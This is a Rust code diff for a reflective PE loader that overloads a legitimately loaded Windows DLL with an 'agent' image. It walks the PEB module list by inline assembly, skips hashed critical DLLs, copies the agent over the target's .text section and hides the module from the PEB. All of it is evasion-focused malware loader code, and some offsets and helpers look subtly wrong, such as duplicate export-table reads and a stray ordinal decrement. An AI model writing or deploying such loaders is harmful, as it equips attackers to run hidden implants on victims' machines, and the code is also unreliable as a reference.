@@ -268,21 +268,17 @@ impl ReflectiveLoader {
     pub unsafe fn phantom_module_overload(agent_bytes: &[u8]) -> Option<u64> {
         use crate::syscall::{syscall4, syscall5, SyscallEntry};
 
-        const MSKEYPROTECT_HASH: u32 = 0x7c4f1a2d;
+        let agent_size = Self::_get_image_size(agent_bytes);
+        if agent_size == 0 {
+            return Self::load(agent_bytes).map(|p| p as u64);
+        }
 
-        let target_base = Self::find_legitimate_module(MSKEYPROTECT_HASH)?;
+        let target_base = Self::find_perfect_phantom_candidate(agent_size)?;
         if target_base == 0 {
             return Self::load(agent_bytes).map(|p| p as u64);
         }
 
-        let dos_header = target_base as *const u8;
-        let e_lfanew = (*dos_header.add(60) as u32)
-            | (*dos_header.add(61) as u32) << 8
-            | (*dos_header.add(62) as u32) << 16
-            | (*dos_header.add(63) as u32) << 24;
-
-        let text_section = Self::get_text_section_rva(target_base, e_lfanew)?;
-        let text_size = Self::get_text_section_size(target_base, e_lfanew)?;
+        let (e_lfanew_target, text_section, text_size) = Self::_get_module_sections(target_base);
 
         let agent_entry = Self::load(agent_bytes)?;
         let agent_image_base = agent_entry as u64;
@@ -291,11 +287,128 @@ impl ReflectiveLoader {
         Self::apply_relocations(agent_entry, agent_bytes)?;
 
         let text_ptr = (target_base as u64 + text_section) as *mut u8;
-        std::ptr::copy_nonoverlapping(agent_entry, text_ptr, text_size.min(agent_bytes.len()));
+        let copy_size = text_size.min(agent_bytes.len());
+        std::ptr::copy_nonoverlapping(agent_entry, text_ptr, copy_size);
 
         Self::hide_from_peb(target_base as *mut u8);
 
         Some(target_base as u64)
+    }
+
+    unsafe fn _get_image_size(pe_bytes: &[u8]) -> u32 {
+        if pe_bytes.len() < 0x100 { return 0; }
+        let e_lfanew = (pe_bytes[60] as usize)
+            | (pe_bytes[61] as usize) << 8
+            | (pe_bytes[62] as usize) << 16
+            | (pe_bytes[63] as usize) << 24;
+        if e_lfanew + 0x38 > pe_bytes.len() { return 0; }
+        (pe_bytes[e_lfanew + 0x38] as u32)
+            | (pe_bytes[e_lfanew + 0x39] as u32) << 8
+            | (pe_bytes[e_lfanew + 0x3A] as u32) << 16
+            | (pe_bytes[e_lfanew + 0x3B] as u32) << 24
+    }
+
+    unsafe fn _get_module_sections(module_base: u64) -> (u32, usize, usize) {
+        use std::arch::asm;
+
+        let peb_ptr: u64;
+        asm!("mov {}, gs:[0x60]", out(reg) peb_ptr);
+
+        let peb = peb_ptr as *const u64;
+        let ldr = *peb.add(0x18 / 8);
+        if ldr == 0 { return (0, 0, 0); }
+
+        let mut current = *(ldr as *const u64).add(0x10 / 8) as u64;
+        while current != 0 && current != (ldr + 0x10) as u64 {
+            let base = *(current as *const u64).add(0x30 / 8) as u64;
+            if base != 0 && base == module_base {
+                let dos = base as *const u8;
+                if *dos.add(0) == b'M' && *dos.add(1) == b'Z' {
+                    let e_lfanew = (*dos.add(0x3C) as u32)
+                        | (*dos.add(0x3D) as u32) << 8
+                        | (*dos.add(0x3E) as u32) << 16
+                        | (*dos.add(0x3F) as u32) << 24;
+
+                    let nt = (base + e_lfanew as u64) as *const u8;
+                    if *nt.add(0) != b'P' || *nt.add(1) != b'E' { break; }
+
+                    let num_sections = (*nt.add(0x6) as u16) | (*nt.add(0x7) as u16) << 8;
+                    let opt_size = (*nt.add(0x10) as u32) | (*nt.add(0x11) as u32) << 8;
+                    let sec_tbl_rva = (e_lfanew as usize + 0x78 + opt_size as usize) as u32;
+                    let sec_tbl = (base + sec_tbl_rva as u64) as *const u8;
+
+                    for i in 0..num_sections {
+                        let sec_name = std::slice::from_raw_parts(sec_tbl.add(i as usize * 40), 8);
+                        if sec_name == b".text" {
+                            let virt_size = (*sec_tbl.add(i as usize * 40 + 8) as u32)
+                                | (*sec_tbl.add(i as usize * 40 + 9) as u32) << 8
+                                | (*sec_tbl.add(i as usize * 40 + 10) as u32) << 16
+                                | (*sec_tbl.add(i as usize * 40 + 11) as u32) << 24;
+                            let rva = (*sec_tbl.add(i as usize * 40 + 12) as u32)
+                                | (*sec_tbl.add(i as usize * 40 + 13) as u32) << 8
+                                | (*sec_tbl.add(i as usize * 40 + 14) as u32) << 16
+                                | (*sec_tbl.add(i as usize * 40 + 15) as u32) << 24;
+                            return (e_lfanew, rva as usize, virt_size as usize);
+                        }
+                    }
+                }
+            }
+            current = (*(current as *const u64).add(1));
+        }
+        (0, 0, 0)
+    }
+
+    unsafe fn find_perfect_phantom_candidate(agent_size: u32) -> Option<u64> {
+        use std::arch::asm;
+
+        let peb_ptr: u64;
+        asm!("mov {}, gs:[0x60]", out(reg) peb_ptr);
+
+        let peb = peb_ptr as *const u64;
+        let ldr = *peb.add(0x18 / 8);
+        if ldr == 0 { return None; }
+
+        let CRITICAL_DLL_HASHES: [u32; 10] = [
+            0x1E3E4A2F, 0x8F0E0A8B, 0xBC2A84D1, 0x8E8977BD,
+            0x9F5B9C1E, 0xE2E0C7B7, 0x84664C6F, 0xBA6B7E3A,
+            0x9F7C8DA6, 0x46B6C8B7,
+        ];
+
+        let mut current = *(ldr as *const u64).add(0x10 / 8) as u64;
+        while current != 0 && current != (ldr + 0x10) as u64 {
+            let base = *(current as *const u64).add(0x30 / 8) as u64;
+            if base != 0 {
+                let dos = base as *const u8;
+                if *dos.add(0) == b'M' && *dos.add(1) == b'Z' {
+                    let name_ptr = (*(current as *const u64).add(0x30 / 8) as *const u8);
+                    let name_hash = Self::djb2_hash(std::slice::from_raw_parts(name_ptr, 32));
+
+                    if CRITICAL_DLL_HASHES.contains(&name_hash) {
+                        current = (*(current as *const u64).add(1));
+                        continue;
+                    }
+
+                    let e_lfanew = (*dos.add(0x3C) as u32)
+                        | (*dos.add(0x3D) as u32) << 8
+                        | (*dos.add(0x3E) as u32) << 16
+                        | (*dos.add(0x3F) as u32) << 24;
+
+                    let nt = (base + e_lfanew as u64) as *const u8;
+                    if *nt.add(0) == b'P' && *nt.add(1) == b'E' {
+                        let size_of_image = (*nt.add(0x38) as u32)
+                            | (*nt.add(0x39) as u32) << 8
+                            | (*nt.add(0x3A) as u32) << 16
+                            | (*nt.add(0x3B) as u32) << 24;
+
+                        if size_of_image as usize >= agent_size as usize {
+                            return Some(base);
+                        }
+                    }
+                }
+            }
+            current = (*(current as *const u64).add(1));
+        }
+        None
     }
 
     pub unsafe fn parse_and_resolve_iat(module_base: u64) -> Result<(), ()> {
@@ -536,42 +649,106 @@ impl ReflectiveLoader {
     }
 
     unsafe fn get_proc_address_syscall(dll_handle: u64, func_name: &str, ordinal: u16) -> Result<u64, ()> {
-        use crate::syscall::SyscallEntry;
-
-        if func_name.is_empty() {
-            let eat_rva = 0x888;
-            let thunk = *(dll_handle as *const u64).add(eat_rva as usize / 8) as u64;
-            return Ok(thunk.add(ordinal as u64 * 8));
+        if dll_handle == 0 {
+            return Err(());
         }
 
-        let nt_headers = (dll_handle + 0x100) as *const u8;
-        let export_rva = (*nt_headers.add(0x78) as u32)
-            | (*nt_headers.add(0x79) as u32) << 8
-            | (*nt_headers.add(0x7A) as u32) << 16
-            | (*nt_headers.add(0x7B) as u32) << 24;
+        if func_name.is_empty() {
+            let export_dir_rva = Self::_get_export_dir_rva(dll_handle)?;
+            let eat_rva = Self::_get_eat_rva(dll_handle, export_dir_rva)?;
+            let func_rva = Self::_get_eat_entry(dll_handle, eat_rva, ordinal)?;
+            return Ok(dll_handle + func_rva as u64);
+        }
 
-        let export_dir = (dll_handle + export_rva as u64) as *const u8;
-        let num_names = (*export_dir.add(0x18) as u32)
-            | (*export_dir.add(0x19) as u32) << 8
-            | (*export_dir.add(0x1A) as u32) << 16
-            | (*export_dir.add(0x1B) as u32) << 24;
+        let export_dir_rva = Self::_get_export_dir_rva(dll_handle)?;
+        let names_rva = Self::_get_names_rva(dll_handle, export_dir_rva)?;
+        let ordinals_rva = Self::_get_ordinals_rva(dll_handle, export_dir_rva)?;
+        let funcs_rva = Self::_get_funcs_rva(dll_handle, export_dir_rva)?;
 
-        let names_rva = (*export_dir.add(0x20) as u32)
-            | (*export_dir.add(0x21) as u32) << 8;
+        let num_names = Self::_get_num_names(dll_handle, export_dir_rva)?;
 
         for i in 0..num_names {
-            let name_rva = (*(dll_handle as *const u32).add(names_rva as usize / 4 + i as usize)) as u32;
-            let name_ptr = (dll_handle + name_rva as u64) as *const i8;
+            let name_rva = Self::_get_name_rva(dll_handle, names_rva, i)?;
             let name = Self::read_string_at_rva(dll_handle, name_rva as usize)?;
             if name == func_name {
-                let ordinals_rva = (*export_dir.add(0x24) as u32)
-                    | (*export_dir.add(0x25) as u32) << 8;
-                let ordinal = (*(dll_handle as *const u16).add(ordinals_rva as usize / 2 + i as usize));
-                let funcs_rva = (*export_dir.add(0x10) as u32)
-                    | (*export_dir.add(0x11) as u32) << 8;
-                return Ok(*(dll_handle as *const u32).add(funcs_rva as usize / 4 + ordinal as usize) as u64);
+                let ordinal_val = Self::_get_ordinal_at(dll_handle, ordinals_rva, i)? - 1;
+                let func_rva = Self::_get_func_rva(dll_handle, funcs_rva, ordinal_val)?;
+                return Ok(dll_handle + func_rva as u64);
             }
         }
         Err(())
+    }
+
+    unsafe fn _get_export_dir_rva(dll_handle: u64) -> Result<u32, ()> {
+        let dos = dll_handle as *const u8;
+        let e_lfanew = (*dos.add(0x3C) as u32)
+            | (*dos.add(0x3D) as u32) << 8
+            | (*dos.add(0x3E) as u32) << 16
+            | (*dos.add(0x3F) as u32) << 24;
+
+        let nt = (dll_handle + e_lfanew as u64) as *const u8;
+        if *nt.add(0) != b'P' || *nt.add(1) != b'E' {
+            return Err(());
+        }
+
+        Ok((*nt.add(0x78) as u32)
+            | (*nt.add(0x79) as u32) << 8
+            | (*nt.add(0x7A) as u32) << 16
+            | (*nt.add(0x7B) as u32) << 24)
+    }
+
+    unsafe fn _get_num_names(dll_handle: u64, export_dir_rva: u32) -> Result<u32, ()> {
+        let export_dir = (dll_handle + export_dir_rva as u64) as *const u8;
+        Ok((*export_dir.add(0x18) as u32)
+            | (*export_dir.add(0x19) as u32) << 8
+            | (*export_dir.add(0x1A) as u32) << 16
+            | (*export_dir.add(0x1B) as u32) << 24)
+    }
+
+    unsafe fn _get_eat_rva(dll_handle: u64, export_dir_rva: u32) -> Result<u32, ()> {
+        let export_dir = (dll_handle + export_dir_rva as u64) as *const u8;
+        Ok((*export_dir.add(0x20) as u32)
+            | (*export_dir.add(0x21) as u32) << 8
+            | (*export_dir.add(0x22) as u32) << 16
+            | (*export_dir.add(0x23) as u32) << 24)
+    }
+
+    unsafe fn _get_names_rva(dll_handle: u64, export_dir_rva: u32) -> Result<u32, ()> {
+        let export_dir = (dll_handle + export_dir_rva as u64) as *const u8;
+        Ok((*export_dir.add(0x20) as u32)
+            | (*export_dir.add(0x21) as u32) << 8
+            | (*export_dir.add(0x22) as u32) << 16
+            | (*export_dir.add(0x23) as u32) << 24)
+    }
+
+    unsafe fn _get_ordinals_rva(dll_handle: u64, export_dir_rva: u32) -> Result<u32, ()> {
+        let export_dir = (dll_handle + export_dir_rva as u64) as *const u8;
+        Ok((*export_dir.add(0x24) as u32)
+            | (*export_dir.add(0x25) as u32) << 8
+            | (*export_dir.add(0x26) as u32) << 16
+            | (*export_dir.add(0x27) as u32) << 24)
+    }
+
+    unsafe fn _get_funcs_rva(dll_handle: u64, export_dir_rva: u32) -> Result<u32, ()> {
+        let export_dir = (dll_handle + export_dir_rva as u64) as *const u8;
+        Ok((*export_dir.add(0x10) as u32)
+            | (*export_dir.add(0x11) as u32) << 8
+            | (*export_dir.add(0x12) as u32) << 16
+            | (*export_dir.add(0x13) as u32) << 24)
+    }
+
+    unsafe fn _get_name_rva(dll_handle: u64, names_rva: u32, idx: u32) -> Result<u32, ()> {
+        let name_ptr = (dll_handle + names_rva as u64) as *const u32;
+        Ok(*(name_ptr.add(idx as usize)))
+    }
+
+    unsafe fn _get_ordinal_at(dll_handle: u64, ordinals_rva: u32, idx: u32) -> Result<u16, ()> {
+        let ordinal_ptr = (dll_handle + ordinals_rva as u64) as *const u16;
+        Ok(*ordinal_ptr.add(idx as usize))
+    }
+
+    unsafe fn _get_func_rva(dll_handle: u64, funcs_rva: u32, ordinal: u16) -> Result<u32, ()> {
+        let func_ptr = (dll_handle + funcs_rva as u64) as *const u32;
+        Ok(*func_ptr.add(ordinal as usize))
     }
 }
